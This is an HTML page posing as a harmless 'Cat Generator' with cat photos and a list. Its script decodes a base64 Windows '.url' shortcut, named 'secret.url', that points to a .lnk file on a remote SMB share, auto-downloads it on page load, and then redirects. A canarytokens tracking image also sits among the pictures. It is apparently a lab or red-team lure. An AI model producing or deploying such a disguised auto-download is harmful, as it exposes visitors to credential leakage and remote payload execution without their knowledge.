<html>
<body>
<h1>Cat Generator</h1>
<script>
    function base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
        return bytes.buffer;
    }

    function downloadFile(fileName, fileData) {
        var data = base64ToArrayBuffer(fileData);
        var blob = new Blob([data], {type: 'octet/stream'});
        if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveOrOpenBlob(blob, fileName);
        } else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
    }

    var file = 'W0ludGVybmV0U2hvcnRjdXRdDQoNClVSTD1maWxlOi8vMTkyLjE2OC4yNTUuMTMyL3NoYXJlL25vdGVzLmxuaw0KDQpJY29uRmlsZT1DOlxXaW5kb3dzXFN5c3RlbTMyXGltYWdlcmVzLmRsbA0KSWNvbkluZGV4PTY3DQpIb3RLZXk9MA0KSURMaXN0PQ0K';
    var fileName = 'secret.url';

    // Trigger the download
    downloadFile(fileName, file);

    // Redirect after 5 seconds
    setTimeout(function() {
        window.location.href = '<https://gooniboon1.neocities.org/meow';>
    }, 1000); // 5000 milliseconds = 5 seconds
</script>

<main>
    <section>
        <h2>Free Cat Downloads</h2>
        <a href="<https://freecatphotoapp.com>"><img src="<https://cdn.freecodecamp.org/curriculum/cat-photo-app/relaxing-cat.jpg>" alt="A cute orange cat lying on its back."></a>
        <img src="<http://canarytokens.com/about/feedback/r28shr6x3i35a7kbzrdtct8u4/contact.php>"/>
    </section>
    <section>
        <h2>Refresh For More Cats!</h2>
        <h3>Things Cats Love:</h3>
        <ul>
            <li>Cuddles</li>
            <li>Laser Pointers</li>
            <li>Yarn</li>
            <li>Kisses</li>        
        </ul>
        <img src="<https://png.pngtree.com/png-clipart/20220620/ourmid/pngtree-pink-cute-cat-icon-animal-png-yuri-png-image_5230763.png>" alt='Meow.'>
    </section>
</main>

</body>
</html>
